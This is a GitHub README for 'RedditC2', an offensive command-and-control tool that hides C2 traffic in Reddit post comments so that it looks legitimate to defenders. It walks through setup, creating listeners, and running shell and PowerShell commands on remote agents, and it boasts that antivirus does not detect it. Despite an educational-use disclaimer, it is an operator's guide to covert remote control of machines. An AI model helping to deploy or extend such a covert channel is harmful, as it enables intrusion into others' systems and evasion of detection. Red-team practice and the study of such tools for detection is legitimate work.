<h1 align="center"> RedditC2</h1>
Abusing Reddit API to host the C2 traffic, since most of the blue-team members use Reddit, it might be a great way to make the traffic look legit.
<p align="center">
  <img width="300" height="300" src="https://user-images.githubusercontent.com/37262788/205896739-7feb0cea-cf04-4011-aa6b-66ba5b82b9ba.png">
</p>

---
> :no_entry_sign: [Disclaimer]: Use of this project is for **Educational/ Testing purposes only**. Using it on **unauthorised machines** is **strictly forbidden**. If somebody is found to use it for **illegal/ malicious intent**, author of the repo will **not** be held responsible.
---

## Requirements
Install **PRAW** library in python3:  
```bash
pip3 install praw
```

## Setup
- Create a [Reddit](https://reddit.com) account and create your first [app](https://www.reddit.com/prefs/apps/).
- Copy the **clientid** and **secret key** and paste it to **config.json** (Located in `/RedditC2/Teamserver/`)
- You are ready to go!

## Usage:
To execute the teamserver:  
```
python3 teamserver.py
```

### Setup a subreddit
You must manually create a subreddit (or use an existing one). Then use the following command to use that subreddit in the C2 Server (In this case I have already created a subreddit named *redditc2*):  
```
RedditC2> set subreddit redditc2
[*] Subreddit set to: redditc2
```

### Setup a listener
Note: a listener means a Reddit Post. The agent and the teamserver will communicate with eachother by looking at the comments of the specific reddit post. To create a listener, use the command below ("the value of the listener can be anything unique"):  
```
RedditC2> set listener myFirstListener
```
Once executed, a new Reddit Post will be created with the same post title as the one you set.
**WARNING**: Once a listener is created, the Reddit Post will always stay there, so you don't need to create the same Reddit Post twice.

### Enter the session
The following command will enter the session, so you can start queueing tasks:  
```
RedditC2> use listener myFirstListener
[+] Entered the session
myFirstListener>
```

### Execute commands
For **Windows/Linux agent**: execute command using `run <command>` syntax:
```
myFirstListener> run whoami
[+] Command sent
[+] Received Output:
kleiton0x7e
```
For **Windows agent**: execute powershell command using `powershell <command>` syntax:  
```
myFirstListener> powershell 2+2
[+] Command sent
[+] Received Output:
4
```

### For additional commands, type `help`:  
```
RedditC2> help

set subreddit                 --> Select the subreddit where you will create the listener
set listener [session number] --> Create a post in subreddit where the traffic will ocurr
use listener [session number]  --> Interact With Each Sessions Individually
run [command]                 --> Execute a cmd command
powershell [command]          --> Execute a powershell command
help                          --> Show the help menu
exit                          --> Exit from the session
clear                         --> Clear the screen
```

## Demo
https://user-images.githubusercontent.com/37262788/206015879-589614d5-1a7a-4c21-a342-75bdfc677a61.mp4

## Workflow
### Teamserver  
1. Go to the specific Reddit Post & post a new comment with the command ("in: <command>")
2. Read for new comment which includes the word "out:"
3. If no such comment is found, go back to step 2
4. Parse and read the output
5. Edit the existing comment to "executed", to avoid reexecuting it

### Client  
1. Go to the specific Reddit Post & read the latest comment which includes "in:"
2. If no new comment is detected, go back to step 1
3. Parse the command out of the comment and executes it locally
4. Reply to the comment with the command's output ("out:" <output>)

## Scanning results
Since it is a custom C2 Implant, it doesn't get detected by any AV as the bevahiour is completely legit.
<img width="406" height="553" src="https://user-images.githubusercontent.com/37262788/205900070-783c65b3-4d83-4d5e-82e3-c20571b403e1.png">

## TO-DO
- [X] Teamserver and agent compatible in Windows/Linux  
- [ ] Generate the agents dynamically (from the TeamServer)
- [ ] Add **pyinstaller** library to compile python agent to exe
- [ ] Tab autocompletion

## Credits
Special thanks to @T4TCH3R for working with me and contributing to this project.
